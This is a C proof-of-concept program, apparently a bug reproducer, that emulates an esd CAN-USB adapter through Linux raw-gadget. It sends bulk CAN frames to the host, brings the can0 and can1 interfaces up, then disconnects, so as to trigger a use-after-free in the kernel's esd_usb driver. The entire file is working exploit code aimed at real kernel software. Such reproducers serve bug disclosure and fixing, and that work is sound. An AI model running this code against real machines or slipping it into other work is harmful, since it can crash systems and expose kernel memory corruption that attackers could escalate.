// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <linux/types.h>
#include <linux/ioctl.h>
#include <linux/usb/ch9.h>
#include <net/if.h>

#define UDC_NAME_LENGTH_MAX 128
struct usb_raw_init {
	__u8 driver_name[UDC_NAME_LENGTH_MAX];
	__u8 device_name[UDC_NAME_LENGTH_MAX];
	__u8 speed;
};
enum usb_raw_event_type {
	USB_RAW_EVENT_INVALID = 0,
	USB_RAW_EVENT_CONNECT = 1,
	USB_RAW_EVENT_CONTROL = 2,
	USB_RAW_EVENT_SUSPEND = 3,
	USB_RAW_EVENT_RESUME = 4,
	USB_RAW_EVENT_RESET = 5,
	USB_RAW_EVENT_DISCONNECT = 6,
};
struct usb_raw_event {
	__u32 type;
	__u32 length;
	__u8 data[];
};
struct usb_raw_ep_io {
	__u16 ep;
	__u16 flags;
	__u32 length;
	__u8 data[];
};
#define USB_RAW_IOCTL_INIT		_IOW('U', 0, struct usb_raw_init)
#define USB_RAW_IOCTL_RUN		_IO('U', 1)
#define USB_RAW_IOCTL_EVENT_FETCH	_IOR('U', 2, struct usb_raw_event)
#define USB_RAW_IOCTL_EP0_WRITE		_IOW('U', 3, struct usb_raw_ep_io)
#define USB_RAW_IOCTL_EP0_READ		_IOWR('U', 4, struct usb_raw_ep_io)
#define USB_RAW_IOCTL_EP_ENABLE		_IOW('U', 5, struct usb_endpoint_descriptor)
#define USB_RAW_IOCTL_EP_DISABLE	_IOW('U', 6, __u32)
#define USB_RAW_IOCTL_EP_WRITE		_IOW('U', 7, struct usb_raw_ep_io)
#define USB_RAW_IOCTL_EP_READ		_IOWR('U', 8, struct usb_raw_ep_io)
#define USB_RAW_IOCTL_CONFIGURE		_IO('U', 9)
#define USB_RAW_IOCTL_VBUS_DRAW		_IOW('U', 10, __u32)
#define USB_RAW_IOCTL_EP0_STALL		_IO('U', 12)

#define ESD_VID 0x0ab4
#define ESD_PID 0x0010

#define ESD_USB_CMD_VERSION   1
#define ESD_USB_CMD_CAN_RX    2
#define ESD_USB_CMD_CAN_TX    3
#define ESD_USB_CMD_SETBAUD   4
#define ESD_USB_CMD_IDADD     6

#define BULK_MAXP 512

static int g_fd = -1;
static int g_ep_in = -1;
static int g_ep_out = -1;
static volatile int g_running = 1;
static volatile int g_configured = 0;

static struct usb_device_descriptor dev_desc = {
	.bLength = sizeof(struct usb_device_descriptor),
	.bDescriptorType = USB_DT_DEVICE,
	.bcdUSB = 0x0200,
	.bDeviceClass = 0,
	.bDeviceSubClass = 0,
	.bDeviceProtocol = 0,
	.bMaxPacketSize0 = 64,
	.idVendor = ESD_VID,
	.idProduct = ESD_PID,
	.bcdDevice = 0x0100,
	.iManufacturer = 0,
	.iProduct = 0,
	.iSerialNumber = 0,
	.bNumConfigurations = 1,
};

static struct usb_endpoint_descriptor ep_in_desc = {
	.bLength = USB_DT_ENDPOINT_SIZE,
	.bDescriptorType = USB_DT_ENDPOINT,
	.bEndpointAddress = 0x81,
	.bmAttributes = USB_ENDPOINT_XFER_BULK,
	.wMaxPacketSize = BULK_MAXP,
	.bInterval = 0,
};
static struct usb_endpoint_descriptor ep_out_desc = {
	.bLength = USB_DT_ENDPOINT_SIZE,
	.bDescriptorType = USB_DT_ENDPOINT,
	.bEndpointAddress = 0x02,
	.bmAttributes = USB_ENDPOINT_XFER_BULK,
	.wMaxPacketSize = BULK_MAXP,
	.bInterval = 0,
};

static int build_config_desc(uint8_t *b)
{
	int p = 0;

	int total = 9 + 9 + 7 + 7;
	b[p++] = 9;
	b[p++] = USB_DT_CONFIG;
	b[p++] = total & 0xff;
	b[p++] = (total >> 8) & 0xff;
	b[p++] = 1;
	b[p++] = 1;
	b[p++] = 0;
	b[p++] = 0x80;
	b[p++] = 0x32;

	b[p++] = 9;
	b[p++] = USB_DT_INTERFACE;
	b[p++] = 0;
	b[p++] = 0;
	b[p++] = 2;
	b[p++] = 0xff;
	b[p++] = 0xff;
	b[p++] = 0xff;
	b[p++] = 0;

	b[p++] = 7;
	b[p++] = USB_DT_ENDPOINT;
	b[p++] = 0x81;
	b[p++] = USB_ENDPOINT_XFER_BULK;
	b[p++] = BULK_MAXP & 0xff;
	b[p++] = (BULK_MAXP >> 8) & 0xff;
	b[p++] = 0;

	b[p++] = 7;
	b[p++] = USB_DT_ENDPOINT;
	b[p++] = 0x02;
	b[p++] = USB_ENDPOINT_XFER_BULK;
	b[p++] = BULK_MAXP & 0xff;
	b[p++] = (BULK_MAXP >> 8) & 0xff;
	b[p++] = 0;
	return p;
}

static int raw_open(void)
{
	int fd = open("/dev/raw-gadget", O_RDWR);
	if (fd < 0) { perror("open raw-gadget"); exit(1); }
	return fd;
}

static void raw_init(int fd)
{
	struct usb_raw_init arg;
	memset(&arg, 0, sizeof(arg));
	strcpy((char *)arg.driver_name, "dummy_udc");
	strcpy((char *)arg.device_name, "dummy_udc.0");
	arg.speed = USB_SPEED_HIGH;
	if (ioctl(fd, USB_RAW_IOCTL_INIT, &arg) < 0) {
		perror("RAW_INIT"); exit(1);
	}
}

static void raw_run(int fd)
{
	if (ioctl(fd, USB_RAW_IOCTL_RUN, 0) < 0) {
		perror("RAW_RUN"); exit(1);
	}
}

static int raw_ep0_write(int fd, struct usb_raw_ep_io *io)
{
	return ioctl(fd, USB_RAW_IOCTL_EP0_WRITE, io);
}
static int raw_ep0_read(int fd, struct usb_raw_ep_io *io)
{
	return ioctl(fd, USB_RAW_IOCTL_EP0_READ, io);
}

static int raw_ep0_ack_out(int fd)
{
	uint8_t buf[sizeof(struct usb_raw_ep_io) + 8];
	struct usb_raw_ep_io *io = (struct usb_raw_ep_io *)buf;
	io->ep = 0; io->flags = 0; io->length = 0;
	return ioctl(fd, USB_RAW_IOCTL_EP0_READ, io);
}
static int raw_ep0_stall(int fd)
{
	return ioctl(fd, USB_RAW_IOCTL_EP0_STALL, 0);
}
static int raw_configure(int fd)
{
	return ioctl(fd, USB_RAW_IOCTL_CONFIGURE, 0);
}
static int raw_vbus_draw(int fd, uint32_t power)
{
	return ioctl(fd, USB_RAW_IOCTL_VBUS_DRAW, power);
}
static int raw_ep_enable(int fd, struct usb_endpoint_descriptor *desc)
{
	return ioctl(fd, USB_RAW_IOCTL_EP_ENABLE, desc);
}

struct usb_raw_control_event {
	struct usb_raw_event inner;
	struct usb_ctrlrequest ctrl;
};
struct ep_io_data {
	struct usb_raw_ep_io inner;
	uint8_t data[4096];
};

static void handle_ep0(int fd, struct usb_ctrlrequest *ctrl)
{
	struct ep_io_data io;
	int rv;

	printf("[ep0] bRequestType=0x%02x bRequest=0x%02x wValue=0x%04x wIndex=0x%04x wLength=%u\n",
	       ctrl->bRequestType, ctrl->bRequest, ctrl->wValue, ctrl->wIndex, ctrl->wLength);

	if (ctrl->bRequestType & USB_DIR_IN) {
		switch (ctrl->bRequest) {
		case USB_REQ_GET_DESCRIPTOR: {
			uint8_t type = ctrl->wValue >> 8;
			io.inner.ep = 0;
			io.inner.flags = 0;
			if (type == USB_DT_DEVICE) {
				memcpy(io.data, &dev_desc, sizeof(dev_desc));
				io.inner.length = sizeof(dev_desc);
			} else if (type == USB_DT_CONFIG) {
				io.inner.length = build_config_desc(io.data);
			} else if (type == USB_DT_STRING) {
				io.data[0] = 4; io.data[1] = USB_DT_STRING;
				io.data[2] = 0x09; io.data[3] = 0x04;
				io.inner.length = 4;
			} else {
				raw_ep0_stall(fd);
				return;
			}
			if (io.inner.length > ctrl->wLength)
				io.inner.length = ctrl->wLength;
			rv = raw_ep0_write(fd, (struct usb_raw_ep_io *)&io);
			if (rv < 0) perror("ep0_write desc");
			return;
		}
		default:
			io.inner.ep = 0; io.inner.flags = 0; io.inner.length = 0;
			raw_ep0_write(fd, (struct usb_raw_ep_io *)&io);
			return;
		}
	} else {
		switch (ctrl->bRequest) {
		case USB_REQ_SET_CONFIGURATION:

			raw_configure(fd);
			raw_vbus_draw(fd, 0x32);
			g_ep_in = raw_ep_enable(fd, &ep_in_desc);
			if (g_ep_in < 0) printf("[!] ep_enable in failed: %s\n", strerror(errno));
			g_ep_out = raw_ep_enable(fd, &ep_out_desc);
			if (g_ep_out < 0) printf("[!] ep_enable out failed: %s\n", strerror(errno));
			rv = raw_ep0_ack_out(fd);
			if (rv < 0) printf("[!] set_config ack failed: %s\n", strerror(errno));
			__sync_synchronize();
			g_configured = 1;
			printf("[*] configured: ep_in=%d ep_out=%d\n", g_ep_in, g_ep_out);
			return;
		default:

			raw_ep0_ack_out(fd);
			return;
		}
	}
}

static int bulk_out_read(int fd, uint8_t *buf, int len)
{
	struct ep_io_data io;
	io.inner.ep = g_ep_out;
	io.inner.flags = 0;
	io.inner.length = len > (int)sizeof(io.data) ? (int)sizeof(io.data) : len;
	int rv = ioctl(fd, USB_RAW_IOCTL_EP_READ, (struct usb_raw_ep_io *)&io);
	if (rv > 0)
		memcpy(buf, io.data, rv);
	return rv;
}

static int bulk_in_write(int fd, uint8_t *buf, int len)
{
	struct ep_io_data io;
	io.inner.ep = g_ep_in;
	io.inner.flags = 0;
	io.inner.length = len;
	memcpy(io.data, buf, len);
	return ioctl(fd, USB_RAW_IOCTL_EP_WRITE, (struct usb_raw_ep_io *)&io);
}

static int build_version_reply(uint8_t *buf)
{

	memset(buf, 0, 32);
	buf[0] = 32 / 4;
	buf[1] = ESD_USB_CMD_VERSION;
	buf[2] = 2;
	buf[3] = 0;
	buf[4] = 0x01; buf[5] = 0x02; buf[6] = 0x00; buf[7] = 0x10;
	return 32;
}

static int build_can_rx(uint8_t *buf, int net, int dlc)
{

	memset(buf, 0, 24);
	int total = 20;
	buf[0] = total / 4;
	buf[1] = ESD_USB_CMD_CAN_RX;
	buf[2] = net;
	buf[3] = dlc & 0x0f;
	buf[8] = 0x10;
	return total;
}

static void *ep0_thread(void *arg)
{
	int fd = g_fd;
	(void)arg;
	for (;;) {
		struct usb_raw_control_event ev;
		ev.inner.type = 0;
		ev.inner.length = sizeof(ev.ctrl);
		int rv = ioctl(fd, USB_RAW_IOCTL_EVENT_FETCH, &ev);
		if (rv < 0) {
			if (errno == EINTR) continue;
			return NULL;
		}
		if (ev.inner.type == USB_RAW_EVENT_CONTROL)
			handle_ep0(fd, &ev.ctrl);
	}
	return NULL;
}

static void *bulk_thread(void *arg)
{
	int fd = g_fd;
	uint8_t buf[2048];
	uint8_t reply[64];
	(void)arg;

	while (!g_configured && g_running) usleep(1000);

	bulk_out_read(fd, buf, sizeof(buf));
	int rlen = build_version_reply(reply);
	bulk_in_write(fd, reply, rlen);

	while (g_running) {
		uint8_t pkt[64];
		int p = 0;
		uint8_t rx[32];
		int n = build_can_rx(rx, 0, 8);
		memcpy(pkt + p, rx, n); p += n;
		n = build_can_rx(rx, 1, 8);
		memcpy(pkt + p, rx, n); p += n;
		int rv = bulk_in_write(fd, pkt, p);
		if (rv < 0) {
			if (errno == ESHUTDOWN || errno == ENODEV || errno == EBADF)
				return NULL;
		}
	}
	return NULL;
}

static void *bulkout_thread(void *arg)
{
	int fd = g_fd;
	uint8_t buf[2048];
	(void)arg;
	while (!g_configured && g_running) usleep(1000);
	while (g_running) {
		int rv = bulk_out_read(fd, buf, sizeof(buf));
		if (rv < 0) {
			if (errno == ESHUTDOWN || errno == ENODEV || errno == EBADF)
				return NULL;
			usleep(500);
		}
	}
	return NULL;
}

static void bring_up_can(void)
{
	int s = socket(AF_INET, SOCK_DGRAM, 0);
	if (s < 0) { perror("socket"); return; }
	const char *names[] = {"can0", "can1"};
	for (int i = 0; i < 2; i++) {
		struct ifreq ifr;
		memset(&ifr, 0, sizeof(ifr));
		strncpy(ifr.ifr_name, names[i], IFNAMSIZ - 1);
		if (ioctl(s, SIOCGIFFLAGS, &ifr) < 0)
			continue;
		ifr.ifr_flags |= IFF_UP;
		ioctl(s, SIOCSIFFLAGS, &ifr);
	}
	close(s);
}

int main(void)
{
	pthread_t t_ep0, t_bulk, t_bulkout;

	setvbuf(stdout, NULL, _IONBF, 0);
	printf("[*] esd_usb disconnect UAF PoC starting\n");

	g_fd = raw_open();
	raw_init(g_fd);
	raw_run(g_fd);

	pthread_create(&t_ep0, NULL, ep0_thread, NULL);
	pthread_create(&t_bulk, NULL, bulk_thread, NULL);
	pthread_create(&t_bulkout, NULL, bulkout_thread, NULL);

	sleep(3);

	printf("[*] bringing CAN interfaces up\n");
	bring_up_can();

	sleep(2);

	printf("[*] triggering disconnect\n");
	g_running = 0;
	close(g_fd);

	sleep(2);
	printf("[*] done\n");
	return 0;
}
